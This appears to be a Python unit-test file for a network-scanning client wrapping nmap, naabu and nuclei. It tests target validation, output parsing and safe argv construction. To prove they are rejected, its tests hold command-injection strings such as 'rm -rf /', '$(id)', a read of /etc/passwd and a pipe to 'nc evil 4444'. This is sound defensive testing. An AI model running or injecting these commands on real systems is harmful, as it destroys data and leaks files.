import os
import unittest
from unittest import mock

from client import tools

FIXTURES = os.path.join(os.path.dirname(__file__), 'fixtures')


def _read(name):
    with open(os.path.join(FIXTURES, name), encoding='utf-8') as handle:
        return handle.read()


class ValidateTargetsTests(unittest.TestCase):
    """The one gate every target list passes through before it ever reaches subprocess: a compromised or buggy server
    naming something other than a plain address, host name or host:port must never reach an argv list."""

    def test_accepts_plain_ips_and_hostnames_and_host_port(self):
        out = tools.validate_targets(['192.0.2.10', '198.51.100.20', 'www.example.test', 'www.example.test:8443'])
        self.assertEqual(out, ['192.0.2.10', '198.51.100.20', 'www.example.test', 'www.example.test:8443'])

    def test_rejects_shell_metacharacters(self):
        for bad in ('192.0.2.10; rm -rf /', '`whoami`', '$(id)', '192.0.2.10 && cat /etc/passwd', '192.0.2.10|nc evil 4444',
                    "192.0.2.10'", '192.0.2.10"', 'target\nwith\nnewlines'):
            with self.assertRaises(tools.TargetError, msg=bad):
                tools.validate_targets([bad])

    def test_rejects_urls_and_schemes(self):
        for bad in ('http://192.0.2.10/', 'https://example.test/admin', 'file:///etc/passwd'):
            with self.assertRaises(tools.TargetError, msg=bad):
                tools.validate_targets([bad])

    def test_rejects_not_a_list_or_an_empty_list(self):
        for bad in (None, 'a-single-string', [], {}, 42):
            with self.assertRaises(tools.TargetError):
                tools.validate_targets(bad)

    def test_rejects_an_overlong_or_non_string_entry(self):
        with self.assertRaises(tools.TargetError):
            tools.validate_targets(['x' * 300])
        with self.assertRaises(tools.TargetError):
            tools.validate_targets([12345])
        with self.assertRaises(tools.TargetError):
            tools.validate_targets([None])

    def test_caps_at_max_targets(self):
        many = [f'198.51.100.{i % 256}' for i in range(200)]
        out = tools.validate_targets(many, limit=10)
        self.assertEqual(len(out), 10)


class NmapParsingTests(unittest.TestCase):
    def test_parses_the_sample_xml_into_the_typed_shape(self):
        result = tools.parse_nmap_xml(_read('sample_nmap.xml'))
        self.assertEqual(len(result['hosts']), 2)
        first = result['hosts'][0]
        self.assertEqual(first['ip'], '192.0.2.10')
        self.assertEqual(first['os_guess'], 'Linux 5.X')
        # Only the open port is kept (closed 9999 is dropped), in document order.
        self.assertEqual(len(first['ports']), 2)
        self.assertEqual(first['ports'][0], {'number': 22, 'protocol': 'tcp', 'state': 'open', 'service_name': 'ssh',
                                             'product': 'OpenSSH', 'version': '8.9'})
        self.assertEqual(first['ports'][1]['number'], 80)
        self.assertEqual(first['ports'][1]['product'], 'nginx')
        second = result['hosts'][1]
        self.assertEqual(second['ip'], '198.51.100.20')
        self.assertEqual(second['os_guess'], '')  # no <os> block for this host

    def test_empty_or_malformed_xml_yields_no_hosts_not_a_crash(self):
        self.assertEqual(tools.parse_nmap_xml(''), {'hosts': []})
        self.assertEqual(tools.parse_nmap_xml('not xml at all'), {'hosts': []})


class NaabuParsingTests(unittest.TestCase):
    def test_parses_the_sample_output_into_the_typed_shape(self):
        result = tools.parse_naabu_output(_read('sample_naabu.jsonl'))
        self.assertEqual(result, {'192.0.2.10': [22, 80], '198.51.100.20': [443], '203.0.113.5': [8080]})

    def test_non_json_lines_are_skipped_not_fatal(self):
        text = 'garbage\n{"ip": "192.0.2.1", "port": 80}\nmore garbage {{{\n'
        self.assertEqual(tools.parse_naabu_output(text), {'192.0.2.1': [80]})

    def test_a_tarpit_address_over_the_cap_is_dropped(self):
        lines = '\n'.join(f'{{"ip": "192.0.2.99", "port": {p}}}' for p in range(1, tools.MAX_OPEN_PER_IP + 10))
        self.assertEqual(tools.parse_naabu_output(lines), {})


class NucleiParsingTests(unittest.TestCase):
    def test_parses_the_sample_jsonl_carrying_matcher_name_through(self):
        findings = tools.parse_nuclei_jsonl(_read('sample_nuclei.jsonl'))
        self.assertEqual(len(findings), 2)
        tech = findings[0]
        self.assertEqual(tech['template_id'], 'tech-detect')
        self.assertEqual(tech['matcher_name'], 'jquery')  # the field this phase adds end to end
        self.assertEqual(tech['host'], 'www.example.test')
        panel = findings[1]
        self.assertEqual(panel['template_id'], 'exposed-panel')
        self.assertEqual(panel['matcher_name'], 'admin-panel')
        self.assertEqual(panel['severity'], 'high')
        self.assertEqual(panel['extracted_results'], ['panel'])
        self.assertEqual(panel['tags'], ['panel', 'exposure'])

    def test_host_of_matches_cveFeed_nuclei_scan_host_of_shape(self):
        self.assertEqual(tools.host_of({'host': 'https://www.example.test/admin'}), 'www.example.test')
        self.assertEqual(tools.host_of({'host': 'www.example.test:8443'}), 'www.example.test')
        self.assertEqual(tools.host_of({'host': 'www.example.test'}), 'www.example.test')


class RunnerArgvTests(unittest.TestCase):
    """The argv passed to subprocess is always a fixed list of flags plus the validated target list - never a string,
    never shell=True - and the target file is written, not interpolated into the command."""

    def test_run_nmap_builds_a_fixed_argv_and_parses_its_stdout(self):
        captured = {}

        def fake_run(argv, timeout, register=None):
            captured['argv'] = argv
            self.assertIsInstance(argv, list)
            with open(argv[argv.index('-iL') + 1], encoding='utf-8') as handle:
                captured['targets_file_contents'] = handle.read()
            return _read('sample_nmap.xml')
        with mock.patch('client.tools._run', side_effect=fake_run):
            result = tools.run_nmap(['192.0.2.10', '198.51.100.20'])
        self.assertEqual(captured['argv'][0], tools.NMAP_BIN)
        self.assertIn('-oX', captured['argv'])
        self.assertEqual(captured['targets_file_contents'], '192.0.2.10\n198.51.100.20\n')
        self.assertEqual(len(result['hosts']), 2)

    def test_run_naabu_builds_a_fixed_argv_and_parses_its_stdout(self):
        with mock.patch('client.tools._run', return_value=_read('sample_naabu.jsonl')) as fake_run:
            result = tools.run_naabu(['192.0.2.10'])
        argv = fake_run.call_args[0][0]
        self.assertEqual(argv[0], tools.NAABU_BIN)
        self.assertIn('-json', argv)
        self.assertEqual(result['ports']['192.0.2.10'], [22, 80])

    def test_run_nuclei_adds_clean_tags_and_severities_only(self):
        with mock.patch('client.tools._run', return_value=_read('sample_nuclei.jsonl')) as fake_run:
            result = tools.run_nuclei(['www.example.test'], tags=['tech', 'not valid; rm -rf /'],
                                      severities=['high', 'not-a-severity'])
        argv = fake_run.call_args[0][0]
        self.assertIn('-tags', argv)
        self.assertEqual(argv[argv.index('-tags') + 1], 'tech')  # the shell-unsafe tag was dropped, not passed through
        self.assertIn('-severity', argv)
        self.assertEqual(argv[argv.index('-severity') + 1], 'high')
        self.assertEqual(len(result['findings']), 2)

    def test_a_malicious_target_never_reaches_subprocess(self):
        with mock.patch('client.tools._run') as fake_run:
            with self.assertRaises(tools.TargetError):
                tools.run_nmap(['192.0.2.10; rm -rf /'])
        fake_run.assert_not_called()


class DetectToolsTests(unittest.TestCase):
    def test_a_missing_binary_is_left_out_not_fatal(self):
        with mock.patch('client.tools.subprocess.run', side_effect=FileNotFoundError):
            self.assertEqual(tools.detect_tools(), [])

    def test_an_installed_binary_is_reported(self):
        with mock.patch('client.tools.subprocess.run', return_value=mock.Mock(returncode=0)):
            self.assertEqual(sorted(tools.detect_tools()), ['naabu', 'nmap', 'nuclei'])


if __name__ == '__main__':
    unittest.main()
